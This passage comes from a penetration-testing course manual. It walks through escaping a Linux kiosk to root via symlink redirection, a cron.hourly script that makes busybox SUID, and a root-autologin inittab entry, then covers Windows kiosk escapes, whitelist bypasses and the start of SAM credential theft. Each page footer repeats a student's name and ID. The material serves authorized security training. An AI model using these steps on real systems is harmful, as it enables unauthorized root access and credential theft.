-rws--x--x    1 root     root         67128 Dec 29  2016 /usr/sbin/mtr 
-r-s--x--x    1 root     root        339544 Mar 29  2019 /usr/sbin/pppd/root 
Listing 518 - SUID binaries 
Upon further examination, only /usr/sbin/mtr and /usr/bin/xlock have recent vulnerabilities. 
However, none of those vulnerabilities affect our specific versions. 
It would be difficult and time-consuming to exploit these binaries without debugging tools so we’ll 
try another approach. 
The ps aux command lists all running processes: 
PID   USER     TIME   COMMAND 
 1    root       0:03 init [4] 
 2    root       0:00 [kthreadd] 
 ... 
 1083 root       0:00 /usr/sbin/acpid -n 
 1120 root       0:00 {xdm} /bin/sh /usr/bin/xdm 
 1123 root       0:00 -bash -c /usr/bin/startx -- -nolisten tcp vt7 > /dev/null 2>&1 
 1138 root       0:00 {startx} /bin/sh /usr/bin/startx -- -nolisten tcp vt7 
 1186 root       0:00 xinit /etc/X11/xinit/xinitrc -- /usr/bin/X :0 -nolisten tcp vt7 
-auth /root/.serverauth.1138 
 1187 root       0:14 /usr/bin/X :0 -nolisten tcp vt7 -auth /root/.serverauth.1138 
 1193 root       0:00 {xinitrc} /bin/sh /etc/X11/xinit/xinitrc 
 1196 root       0:01 /usr/bin/openbox --startup /usr/libexec/openbox-autostart 
OPENBOX 
 1199 root       0:00 dbus-launch --exit-with-session /usr/bin/openbox-session 
 1200 root       0:00 /usr/bin/dbus-daemon --syslog --fork --print-pid 5 --print-
address 7 --session 
 1344 root       0:00 x11vnc -rfbauth /root/.vnc/passwd -auth /root/.serverauth.1138 -
display :0 -nomodtweak -noxdamage -shared -forever -loop5000 -bg 
 ... 
23310 guest      0:00 ps aux | grep root 
Listing 519 - Finding root-owned processes 
Based on this output, it seems the kiosk is running a number of root processes which we may be 
able to use to escalate our privileges. One of these processes is “openbox”,653 the X window 
manager used by the kiosk’s custom interface. 
This finding warrants further investigation. 
 
652 (g0tmi1k, 2020), https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
653 (Openbox, 2013), http://openbox.org/wiki/Main_Page 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
435 
11.4.1 
Thinking Outside the Box 
Openbox supports a command-line option (--replace) which will replace the currently running 
window manager instance: 
Syntax: openbox [options] 
 
Options: 
  --help              Display this help and exit 
  --version           Display the version and exit 
  --replace           Replace the currently running window manager 
  --config-file FILE  Specify the path to the config file to use 
  --sm-disable        Disable connection to the session manager 
 
Passing messages to a running Openbox instance: 
  --reconfigure       Reload Openbox's configuration 
  --restart           Restart Openbox 
  --exit              Exit Openbox 
 
Debugging options: 
  --sync              Run in synchronous mode 
  --startup CMD       Run CMD after starting 
  --debug             Display debugging output 
  --debug-focus       Display debugging output for focus handling 
  --debug-session     Display debugging output for session management 
  --debug-xinerama    Split the display into fake xinerama screens 
 
Please report bugs at http://bugzilla.icculus.org 
Listing 520 - Openbox help output 
If we run the following command in our custom terminal, the current X windows session is 
stopped and restarted: 
openbox --replace 
Listing 521 - Command to kill the X windows session 
This kills all currently-running graphical programs including our VNC connection. However, the 
kiosk system itself is not restarted, which means we won’t lose changes made since the last 
reboot. This is very interesting. We seem to have reloaded openbox, which was started by root, 
even though we requested the restart as the guest user. 
This certainly warrants further investigation. 
We know that as the guest user, we should have control over the files in our home folder. Our 
current kiosk interface is the Firefox browser which stores the user’s profile folder in 
/home/guest/.mozilla/firefox/c3pp43bg.default. 
When we edit files in this folder and force an openbox restart, openbox recreates the Firefox 
bookmark configuration file (/home/guest/.mozilla/firefox/c3pp43bg.default/bookmarks.html) 
each time it restarts. We can demonstrate this with a simple test. 
This file contains the default bookmarks including the kiosk’s main page address: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
436 
 
Figure 201: Bookmarks.html file contents 
If we delete this file and again run openbox --replace, the bookmark file is recreated: 
 
Figure 202: Bookmarks file automatically rebuilt 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
437 
 
This tells us that the kiosk software is rebuilding the bookmarks file every time the X session 
restarts. According to the permissions on the file, it is owned by the guest user. However, it 
stands to reason that the kiosk operates at a higher privilege level, so a second simple test may 
be in order. 
Since the kiosk is configured to write the bookmarks file in the c3pp43bg.default folder, let’s 
replace that folder with a symlink654 in an attempt to force the kiosk to write the bookmarks file to 
a different location. If the underlying kiosk refresh script raises privileges, we may be able to 
redirect it to write in a privileged directory. 
Before we test this, let’s backup our profile folder: 
mv /home/guest/.mozilla/firefox/c3pp43bg.default /home/guest/.mozilla/firefox/old_prof 
Listing 522 - Backing up the old profile folder 
Next, we’ll create a symlink to /usr/bin, a folder the guest user can not normally write to. 
ln -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default 
Listing 523 - Creating a softlink 
The symlink looks like this: 
 
Figure 203: Soft link created 
 
654 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Symbolic_link 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
438 
 
Now that the symlink is created, let’s run openbox --replace to attempt to regenerate 
bookmarks.html. 
Once reconnected to the kiosk, we find that the bookmarks file has been written to /usr/bin, 
indicating that the process creating it is in fact privileged (Figure 204): 
 
Figure 204: Bookmarks.html written in /usr/bin 
This is a huge breakthrough. We can write files to privileged directories! 
However, in order to escalate our privileges, we need to make the file executable and we must 
write executable commands to the file. We own the file, so let’s try to make it executable with 
chmod. If we check the file’s permissions, we find that the permissions have changed. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
439 
 
Figure 205: Bookmarks.html made executable 
This is promising. We can modify the file after creation. However, despite the fact that the we own 
the file, we are not able to rename it. This is dictated by the permissions of the containing folder. 
Now, we need to add executable instructions to the file. Our previous method of text editing, 
ScratchPad, won’t allow us to save changes to the file: 
 
Figure 206: ScratchPad fails trying to save to bookmarks.html 
This is likely due to the permissions on the parent folder. 
Ordinarily, we could use a command-line editor, but since our makeshift gtkdialog terminal is non-
interactive, this won’t work. We could also consider using a graphical editor, but there are no 
graphical editors installed on the system. 
We might also consider building the file one line at a time with echo commands and standard 
bash redirects. However, our gtkdialog terminal uses a bash redirect when processing our 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
440 
command ($CMDTORUN > /tmp/termout.txt). If our terminal command contains another 
redirect, it would be canceled out by the redirect to /tmp/termout.txt. 
To get around this, we’ll use Scratchpad to create testscript.sh in our home directory: 
echo "#!/bin/bash" > /usr/bin/bookmarks.html 
echo "gtkdialog -f /home/guest/terminal.txt" >> /usr/bin/bookmarks.html 
Listing 524 - Script content to write into bookmarks.html 
This simple script will overwrite the contents of our bookmarks file: 
 
Figure 207: Our script written to /usr/bin/bookmarks.html 
The bookmarks file has been overwritten by a simple script that will launch our gtkdialog terminal. 
Our goal is to get the system to run this as root, giving us a root shell. 
With the script in place, we need to get the system to run it as a privileged user. Normally, we 
could leverage several privilege escalation techniques. 
For example, the scripts in the protected /etc/profile.d/ folder, all of which must have an .sh 
extension,655 are run at user login. If we wrote our bookmark file to that directory, and added a .sh 
extension, our terminal would run as root when that user logged in. Unfortunately, we cannot 
rename the file. We’ll face this restriction on all other privileged directories on the system. This 
means we’re stuck with the bookmarks.html filename. 
 
655 (Mendel Cooper, 2012), http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_01.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
441 
There is another potential option. The /etc/cron.d directory is a part of the Cron job scheduler. Any 
scripts placed in this folder would be run as root. However, as with /etc/profile.d, there is a catch. 
Files placed in /etc/cron.d must be owned by the root user or they will not run.656 Since we cannot 
change the ownership of the file, we cannot leverage this attack vector either. 
However, according to the reference above, certain cron directories including /etc/cron.hourly, 
/etc/cron.daily, /etc/cron.weekly, and /etc/cron.monthly do not have such stringent requirements 
and will accept non-root-owned files. Given the obvious timing benefits, /etc/cron.hourly is our 
best option. Let’s focus on this attack vector. 
11.4.2 
Root Shell at the Top of the Hour 
To begin, we’ll symlink our bookmark file to /etc/cron.hourly and again run openbox --replace. 
Note that we need to delete the existing symlink before defining the new one. 
 
Figure 208: Our bookmarks.html file written to /etc/cron.hourly 
We should be able to run a gtkdialog terminal via this script and it should run as root. However, if 
our terminal is closed or crashes, we’ll need to wait another hour to get another one. Let’s give 
ourselves a backdoor to root access instead. 
Earlier in the enumeration process, we discovered /bin/busybox which provides various Unix 
utilities in a single file, including command shells such as Bash and sh. Let’s copy this to 
 
656 (StackExchange, 2020), https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-
d-and-crontab 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
442 
/home/guest using our gtkdialog terminal to preserve the original and create a cron script that will 
change the ownership of the file to root and set it to SUID. If this script is run as root, it will allow 
us to run busybox with root privileges. 
We’ll create the following script with Scratchpad… 
echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html 
echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html 
echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html 
Listing 525 - Code to set SUID bit on our local busybox file 
and again write the contents of our bookmarks file, this time in /etc/cron.hourly, by running the 
above script: 
 
Figure 209: Bookmarks.html set to change busybox to SUID 
After making our bookmarks.html script executable, it will execute at the top of the next hour, 
making our copy of busybox root-owned and SUID: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
443 
 
Figure 210: Busybox now has SUID bit set 
Good. Let’s try out our new, “upgraded” busybox. According to the help output, we can run shell 
commands with the following syntax: 
/home/guest/busybox sh command_to_run 
Listing 526 - Busybox syntax 
Trying to call gtkdialog directly using this method doesn’t seem to work. We receive no 
response in our terminal and no gtkdialog window is displayed. It’s possible this has to do with 
the way the commands are being interpreted by the gtkdialog action and passed to the shell but 
since we don’t receive any output or errors, it’s difficult to know. 
To get around this, we’ll create a runterminal.sh script with Scratchpad that will launch our 
terminal: 
#!/bin/bash 
/usr/bin/gtkdialog -f /home/guest/terminal.txt 
Listing 527 - Script to fire a terminal 
Then, we’ll execute it with busybox: 
/home/guest/busybox sh /home/guest/runterminal.sh 
Listing 528 - Running the script via busybox 
This will display a new gtkdialog terminal window. Let’s run whoami in our new terminal: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
444 
 
Figure 211: We now have root access 
Excellent! We have a root shell! 
11.4.3 
Getting Root Terminal Access 
Now that we have a root shell, we can attempt to add some “quality of life” improvements. As 
useful as our homemade terminal is, a full-blown terminal session would be even better. As 
mentioned previously, we are limited by the fact that we don’t have access to terminal emulators. 
However, 
Linux 
systems 
have 
built-in 
console 
sessions 
called 
TTYs657 
or 
virtual 
console/terminals.658 This is normally accessed from a Linux desktop with the keyboard 
shortcuts of C+E+# through ^, with each function key presenting a different session. 
However, if we try these key combinations in our kiosk session, they don’t work. 
We can use /usr/bin/xdotool659 to programmatically send keyboard shortcuts via the command 
line and verify that the shortcuts are actually being delivered to the X windows environment. 
Let’s use the following command in our gtkdialog terminal to test the shortcut: 
xdotool key Ctrl+Alt+F3 
Listing 529 - Sending keyboard shortcuts via the command line 
 
657 (Dave McKay, 2019), https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/ 
658 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Virtual_console 
659 (Jordan Sissel), http://linuxcommandlibrary.com/man/xdotool.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
445 
In this case, the kiosk doesn’t respond, which means virtual terminals may be disabled in this 
restricted kiosk environment. If this is the case, we should be able to change this with our root 
privileges. However, this may require a system restart, which will trigger the kiosk’s “self-healing” 
mechanism and revert the system. Let’s investigate this option further. 
Inspection of the /etc/X11/xorg.conf.d/10-xorg.conf configuration file reveals that “DontVTSwitch” 
is uncommented, which means VT switching is disabled.660 VT switching refers to the ability to 
switch dynamically between virtual terminal661 interfaces. 
To modify this, we’ll copy the original file from /etc/X11/xorg.conf.d/10-xorg.conf to a temporary 
file in our home folder, /home/guest/xorg.txt: 
cp /etc/X11/xorg.conf.d/10-xorg.conf /home/guest/xorg.txt 
Listing 530 - Copying the Xorg configuration file 
Then we’ll adjust the permissions so we can edit it in Scratchpad: 
chmod 777 /home/guest/xorg.txt 
Listing 531 - Fixing the Xorg configuration file permissions 
One important note is that if we make changes using Scratchpad to scripts and files, the 
permissions are often modified by Scratchpad to be 600. It’s necessary to use chmod to revert 
them back to their proper permissions after editing is complete. 
We can then open Scratchpad to comment out “DontVTSwitch” in the /home/guest/xorg.txt file: 
 
Figure 212: Editing the Xorg configuration 
 
660 (The GNOME Project, 2014), https://help.gnome.org/admin/system-admin-guide/stable/lockdown-command-line.html.en 
661 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Virtual_console 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
446 
 
We can then save the file and copy it back to its original location: 
cp /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf  
Listing 532 - Copying the Xorg configuration file back 
Then we’ll change the permissions back to their original state: 
chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf 
Listing 533 - Fixing the Xorg configuration file permissions 
After replacing the file, we can again use openbox --replace to restart the X session. We’ll also 
need to reopen a new root Gtk terminal instance. 
Once we have VT switching enabled, we need to define a TTY for the system in the /etc/inittab 
file. 
We can copy this file as we did with our Xorg configuration file to a temporary file in our home 
folder: 
cp /etc/inittab /home/guest/inittab.txt 
Listing 534 - Copying the inittab file 
We’ll need to modify the permissions on this file to 777 as we did with our Xorg configuration file 
so Scratchpad can write to it: 
chmod 777 /home/guest/inittab.txt 
Listing 535 - Fixing the temporary inittab file permissions 
In the “Standard console login” section we discover that the two consoles are commented out 
and none are defined for TTYs 3-6 (Figure 213): 
 
Figure 213: Unmodified /etc/inittab file in Scratchpad 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
447 
 
We’ll add a TTY by adding the following line to the “Standard console login” section under the two 
commented lines: 
c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux 
Listing 536 - Entry for a new TTY in /etc/inittab 
This instructs the TTY to automatically log in as the root user662 (Figure 214). 
 
Figure 214: Adding a console to inittab 
We can then save the file and copy it back to /etc/inittab: 
cp /home/guest/inittab.txt /etc/inittab 
Listing 537 - Copying our edited inittab over the old one 
and replace the permissions as before: 
chmod 600 /etc/inittab 
Listing 538 - Restoring inittab permissions 
The following command will dynamically reload the settings without rebooting the system:663 
/sbin/init q 
Listing 539 - Command to reload inittab file dynamically 
At this point, if we were physically located at the kiosk, we could use xdotool key Ctrl+Alt+F3 
to switch to a TTY terminal session. However, because we are accessing the kiosk through VNC, 
 
662 (Gentoo Foundation, Inc., 2020), https://wiki.gentoo.org/wiki/Automatic_login_to_virtual_console 
663 (Rick Moen ), http://linuxmafia.com/faq/Admin/init.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
448 
we must perform a few extra steps. Using Scratchpad, we can create a script containing the code 
in Listing 540. 
#!/bin/bash 
killall x11vnc  
x11vnc -rawfb vt3 
Listing 540 - getmeatty.sh script 
This will kill the existing VNC server instance and start a new one connected directly to the virtual 
terminal. 
After making the file executable, we can run the script and after a few seconds, we’re kicked out 
of our VNC session. If we reconnect, we are immediately presented with a text terminal interface, 
logged in as the root user (Figure 215): 
 
Figure 215: Logged into TTY session as root 
At this point, we have full root access to the system in an actual terminal session. Next we could 
begin moving laterally within the internal network. 
11.4.3.1 Exercises 
1. 
Determine which locations we can write to as a normal user.  
2. 
Get a list of root-owned processes running on the system and determine their purpose/use. 
3. 
What cron jobs are running on the system currently? 
4. 
Try to determine the mechanism by which the kiosk refresh scripts are replacing 
bookmarks.html. Why does it only work when setting a symlink to a directory and not just 
pointing to the bookmarks.html file instead? 
11.5 Windows Kiosk Breakout Techniques 
Although this module primarily focused on a Linux-based kiosk, there are several valuable 
concepts and techniques we could leverage against Windows-based kiosks. 
First, Windows Explorer is often tightly integrated into applications, which can be a benefit to app 
developers, but a liability for kiosk security. By extension, each application inherently supports 
myriad options for accessing resources. This is especially true of Internet Explorer, which serves 
as the foundation for many kiosks. Kiosk developers must exercise extreme vigilance as the 
smallest oversight can expose the system to compromise. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
449 
Windows supports many different environment variables that can act as shortcuts to different 
locations on the system.664 As a result, kiosk developers sometimes forget about or disregard 
them when creating input restrictions. If a browser-based kiosk accepts text input, we could 
substitute environment variables for full file paths. For example, the %APPDATA% variable 
translates to a local folder that stores data created by programs. If the kiosk has restricted 
filesystem browsing, we may be able to use this environment variable to browse the otherwise-
protected locations on the filesystem: 
 
Figure 216: Using Windows environment variables in user input 
A few other useful environment variables include: 
Enviroment variable 
Location 
%ALLUSERSPROFILE% 
C:\Documents and Settings\All Users 
%APPDATA% 
C:\Documents and Settings\Username\Application Data 
%COMMONPROGRAMFILES% 
C:\Program Files\Common Files 
%COMMONPROGRAMFILES(x86)% C:\Program Files (x86)\Common Files 
%COMSPEC% 
C:\Windows\System32\cmd.exe 
%HOMEDRIVE% 
C:\ 
%HOMEPATH% 
C:\Documents and Settings\Username 
%PROGRAMFILES% 
C:\Program Files 
 
664 (SS64, 2020), https://ss64.com/nt/syntax-variables.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
450 
%PROGRAMFILES(X86)% 
C:\Program Files (x86) (only in 64-bit version) 
%SystemDrive% 
C:\ 
%SystemRoot% 
C:\Windows 
%TEMP% and %TMP% 
C:\Documents and Settings\Username\Local 
Settings\Temp 
%USERPROFILE% 
C:\Documents and Settings\Username 
%WINDIR% 
C:\Windows 
Table 2 - Environment Variables 
Similarly, we may be able to enter full UNC paths in user input boxes or file browsers as shown in 
Figure 217. 
 
Figure 217: Using UNC paths in user input 
Specifically, 
we 
may 
be 
restricted 
from 
accessing 
C:\Windows\System32, 
but 
\\127.0.0.1\C$\Windows\System32\ may be allowed. 
Windows also allows the use of the “shell:” shortcut665 in file browser dialogs to provide access to 
certain folders. 
Although there are many shell commands666 available, a few useful examples include: 
 
665 (SS64, 2020), https://ss64.com/nt/shell.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
451 
Command 
Action 
shell:System 
Opens the system folder 
shell:Common 
Start Menu Opens the Public Start Menu folder 
shell:Downloads 
Opens the current user’s Downloads folder 
shell:MyComputerFolder Opens the “This PC” window, showing devices and drives for the 
system 
Table 3 - Shell Commands 
We may also be able to use other browser-protocol style shortcuts such as file:/// to access 
applications or to access files that may open an application.667 
Aside from inputting paths manually, it may be possible to search for files that we can’t access 
directly. For example, entering a path to a specific file may be blocked, but an embedded search 
box may allow an unfiltered search which we can use to navigate to a file from the search results 
as shown in Figure 218. 
 
Figure 218: Using Windows search functionality to access applications 
 
666 (Winhelponline, 2020), https://www.winhelponline.com/blog/shell-commands-to-access-the-special-folders 
667 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-
apis/jj710217(v=vs.85) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
452 
 
Similarly, if we can get access to a help dialog, we may be able to search for specific utilities such 
as Notepad, cmd.exe, or PowerShell. The help entries for these will often contain embedded 
shortcuts we can click to run various programs: 
 
Figure 219: Using help dialog to access applications 
This strategy works for a variety of dialog boxes. If a clickable link is available in a search utility, 
we should try to take advantage of that by exploring the link and attempting various combinations 
of mouse-clicks and function-key clicks on the link. Many of these aren’t (or can’t) be properly 
restricted. 
File shortcuts also offer interesting avenues for expansion as they may provide access to files 
and locations that are normally restricted. For example, when using a file browser dialog in a 
kiosk, we may be able to create shortcuts by right-clicking on files and locations and choosing 
Create shortcut (Figure 220). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
453 
 
Figure 220: Creating shortcuts through an Open File dialog window 
If this works, we may be able to modify the shortcut and change the target application in the 
shortcut properties to an application like cmd.exe or powershell.exe which could launch an 
interactive shell on the system. 
This approach also works with various special-use folders in file browser dialog windows. Right-
clicking files in the file browser may present an option to add the file or a shortcut to “Favorites” or 
send it to a particular location. Because right-click functionality is widely-used in Windows 
applications, it is difficult to restrict in a kiosk environment and should be attempted frequently as 
we increase our latitude on the system. These right-click menus are a common weakness in kiosk 
systems. 
If we are able to browse the filesystem, such as through a file open or save dialog, but right-
clicking is disabled, it may be possible to start an application by dragging and dropping files onto 
it. Good candidates for this are cmd.exe and powershell.exe, if they are available on the kiosk, as 
they can provide a system shell. If the filetype being dragged is associated with the program, the 
program will likely open it. 
With cmd.exe and powershell.exe, any file should be enough to open a command window: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
454 
 
Figure 221: Dragging a file to cmd.exe 
The print dialog, if available in the kiosk, can provide a useful and often-overlooked avenue to a 
working file browser dialog, even in extremely locked-down systems. Once a file browser is 
activated, we can use techniques similar to those we previously discussed in this module to 
escape from the dialog and run applications or manipulate the filesystem (Figure 222). Note that 
this may work on Linux systems as well. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
455 
 
Figure 222: Using Print dialog to access Windows Explorer features 
We should also attempt to use various keyboard shortcuts to expand our level of access. For 
example, C+E+H can potentially launch the lock screen menu, which can allow us to log 
in as a different user or start Task Manager (Figure 223). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
456 
 
Figure 223: Windows lock screen with option to start Task Manager 
Task Manager can be started directly with C+E+~. There are also many combinations 
using the Windows key that can be useful if they aren’t blocked. Some other frequently-useful 
shortcuts include: 
Key Menu/Application 
! 
Help 
C+P Print Dialog 
E+A 
Task Switcher 
G+R Run menu 
C+~ Start Menu 
Table 4 - Shortcuts 
In addition to kiosk interface-focused restrictions, Windows systems may also include various 
application whitelisting or blacklisting strategies. There are many potential bypasses for these, 
which are out of the scope of this module. However, a simple option is to copy and paste binaries, 
rename them, and attempt to run them. Some systems may restrict powershell.exe but a copied 
and renamed version will run without issue (Figure 224). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
457 
 
Figure 224: Running a restricted binary by copying and then renaming it 
Many blacklists/whitelists work on either a hash of the file, the filename, or the file path. 
Modifying any one of these will bypass blacklists. The reverse is true for whitelisting. If we have 
write access to a known whitelisted file, we can replace it with a binary that is normally restricted. 
Most of the strategies in this module are operating system-agnostic. The philosophy of kiosk 
breakouts is to explore any available functionality and attempt to misuse it to free ourselves from 
the “guided experience” of the kiosk system. Because locking down all dialog windows, embedded 
links and shortcuts in an operating system is a monumental task, with enough time we will likely 
find a weakness in the defenses and escape. 
11.5.1.1 Exercises 
1. 
Using Notepad on a Windows machine, open the help dialog and search for different utilities 
that might expand our capabilities in a restricted environment. Expand on the examples in 
this section to get a direct link through the help pages to open an application. What 
applications are available via this method?  
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
458 
11.6 Wrapping Up 
In this module, we have demonstrated how, by thinking outside the box and exploiting existing 
and intended functionality, a dedicated attacker can escape a restricted kiosk or thin client user 
interface and compromise the system. We’ve also demonstrated the importance of working with 
tools natively available on a system to create openings, rather than relying on external utilities and 
access. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
459 
 
12 Windows Credentials 
Windows implements a variety of authentication and post-authentication privilege mechanisms 
that can become quite complex in an Active Directory environment. 
In this module, we’ll discuss Windows credentials and present attack vectors that leverage or 
disclose them. We’ll begin with an investigation into local authentication credentials and discuss 
post-authentication privileges as well as Active Directory authentication and Kerberos. 
12.1 Local Windows Credentials 
Windows can authenticate local user accounts as well as those belonging to a domain, which are 
stored within Active Directory. 
In this section, we’ll discuss credentials for local user accounts and demonstrate how they can be 
used as part of an attack chain. 
12.1.1 
SAM Database 
Local Windows credentials are stored in the Security Account Manager (SAM) database668 as 
password hashes using the NTLM hashing format,669 which is based on the MD4670 algorithm. 
We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash 
is tied to a user account and password registered on that machine. 
Although it is rare to find matching local credentials between disparate machines, the built-in 
default-named Administrator account671 is installed on all Windows-based machines. 
This account has been disabled on desktop editions since Windows Vista, but it is enabled on 
servers by default. To ease administrative tasks, system administrators often enable this default 
account on desktop editions and set a single shared password. 
Given the capability of this attack vector, let’s walk through an example. In this case, we’ll attack 
the default local administrator account. 
Every Windows account has a unique Security Identifier (SID)672 that follows a specific pattern as 
shown in Listing 541: 
S-R-I-S 
Listing 541 - Security Identifier format prototype 
 
668 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Security_Account_Manager 
669 (Péter Gombos, 2018), https://medium.com/\@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4 
670 (Wikipedia, 2020), https://en.wikipedia.org/wiki/MD4 
671 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts 
672 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Security_Identifier 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
460 
In this structure, the SID begins with a literal “S” to identify the string as a SID, followed by a 
revision level (usually set to “1”), an identifier-authority value (often “5”) and one or more 
subauthority values. 
The subauthority will always end with a Relative Identifier (RID)673 representing a specific object 
on the machine. 
The local administrator account is sometimes referred to as RID 500 due to its 
static RID value of 500. 
Let’s use PowerShell and WMI to locate the SID of the local administrator account on our 
Windows 10 victim machine. 
First, we’ll determine the local computername from the associated environment variable and use 
it with the WMI Win32_UserAccount674 class. To obtain results for the local administrator account, 
we’ll specify the computername through the Domain property and the account name through the 
Name property. 
PS C:\> $env:computername 
CLIENT 
 
PS C:\> [wmi] "Win32_userAccount.Domain='client',Name='Administrator'" 
 
 
AccountType : 512 
Caption     : client\Administrator 
Domain      : client 
SID         : S-1-5-21-1673717583-1524682655-2710527411-500 
FullName    : 
Name        : Administrator 
Listing 542 - Relative identifier value of 500 
The highlighted section of the output (Listing 542) reveals a RID value of 500 as expected. 
Next, we’ll attempt to obtain credentials for this user account from the SAM database. The SAM is 
located at C:\Windows\System32\config\SAM, but the SYSTEM process has an exclusive lock on 
it, preventing us from reading or copying it even from an administrative command prompt: 
C:\>copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam 
The process cannot access the file because it is being used by another process. 
        0 file(s) copied. 
Listing 543 - Failure to copy the SAM database 
 
673 (Microsoft, 2018), https://msdn.microsoft.com/en-
us/library/windows/desktop/ms721604(v=vs.85).aspx#_security_relative_identifier_gly 
674 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-useraccount 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
461 
It is possible to perform a physical attack as well by booting the computer off an 
external media like a USB into a Linux-based operating system and accessing the 
content of the hard drive. 
There are two potential workarounds. First, we could use the Volume Shadow Copy Server,675 
which can create a snapshot (or “shadow volume”) of the local hard drive with vssadmin,676 which 
is installed on Windows 8.1 and later. We can create a new shadow volume with the create 
shadow option, but this option is only available on server editions677 of the tool. 
